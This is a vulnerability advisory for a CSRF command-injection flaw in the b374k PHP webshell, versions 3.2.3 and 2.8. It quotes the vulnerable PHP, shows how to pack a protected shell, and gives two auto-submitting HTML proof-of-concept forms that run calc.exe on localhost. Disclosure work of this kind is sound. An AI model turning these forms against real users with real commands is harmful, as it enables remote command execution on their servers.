@@ -1,0 +1,154 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-B374K-CSRF-CMD-INJECTION.txt
+
+
+Vendor:
+============================================
+github.com/b374k/b374k
+code.google.com/p/b374k-shell/downloads/list
+code.google.com/archive/p/b374k-shell/
+
+
+Product:
+==============================================
+b374k versions 3.2.3 and 2.8
+
+b374k is a PHP Webshell with many features such as:
+
+File manager (view, edit, rename, delete, upload, download as archive,etc)
+Command execution, Script execution (php, perl, python, ruby, java,
+node.js, c)
+Give you shell via bind/reverse shell connect
+Connect to DBMS (mysql, mssql, oracle, sqlite, postgresql, and many more
+using ODBC or PDO)
+Process list/Task manager.
+
+This is useful for system/web admin to do remote management without opening
+cpanel, connecting using ssh,
+ftp etc. All actions take place within a web browser.
+
+Note:
+b374k is considered by some as a malicious backdoor and is flagged by some
+AV upon download.
+
+
+Vulnerability Type:
+=============================
+CSRF Remote Command Injection
+
+
+Vulnerability Details:
+=====================
+
+No CSRF protection exists in b374k Web Shell allowing arbitrary OS command
+injection, if currently
+logged in user visits our malicious website or clicks our infected linxs.
+
+vulnerable b374k code:
+
+<?php
+if(isset($_GP['cmd'])) <------ $_GP holds value of $_GET passed to the
+shell.
+
+<form action='<?php echo $s_self; ?>' method='post'>
+<input id='cmd' onclick="clickcmd();" class='inputz' type='text' name='cmd'
+style='width:70%;' value='<?php
+if(isset($_GP['cmd'])) echo "";
+
+else echo "- shell command -";
+?>' />
+<noscript><input class='inputzbut' type='submit' value='Go !'
+name='submitcmd' style='width:80px;' /></noscript>
+
+</form>
+
+
+Exploit code(s):
+=================
+
+Run Windows calc.exe as POC...
+
+[CSRF Command Injections]
+
+ v3.2
+
+
+Adding password and packing to b374k single PHP file.
+
+c:\xampp\htdocs\b374k-master>php -f index.php -- -o myshell.php -p abc123
+ -s -b -z gzcompress -c 9
+b374k shell packer 0.4.2
+
+Filename                : myshell.php
+Password                : xxxxxx
+Theme                   : default
+Modules                 : convert,database,info,mail,network,processes
+Strip                   : yes
+Base64                  : yes
+Compression             : gzcompress
+Compression level       : 9
+Result                  : Succeeded : [ myshell.php ] Filesize : 111419
+
+
+(CSRF Command injection 1)
+
+<form id='ABYSMALGODS' action='
+http://localhost/b374k-master/myshell.php?run=convert,database,info,mail,network,processes'
+method='post'>
+<input id='cmd' type='text' name='terminalInput' value='calc.exe' />
+<script>document.getElementById('ABYSMALGODS').submit()</script>
+</form>
+
+
+
+ v2.8
+
+(CSRF Command injection 2)
+
+<form id='HELL' action='http://localhost/b374k-2.8.php?' method='post'>
+<input id='cmd' type='text' name='cmd' value='calc.exe' />
+<script>document.getElementById('HELL').submit()</script>
+</form>
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Description:
+==================================================
+
+Request Method(s):              [+]  POST
+
+
+Vulnerable Product:             [+]  b374k 3.2 and 2.8
+
+
+Vulnerable Parameter(s):        [+]  terminalInput, cmd
+
+
+Affected Area(s):               [+]  OS
+
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
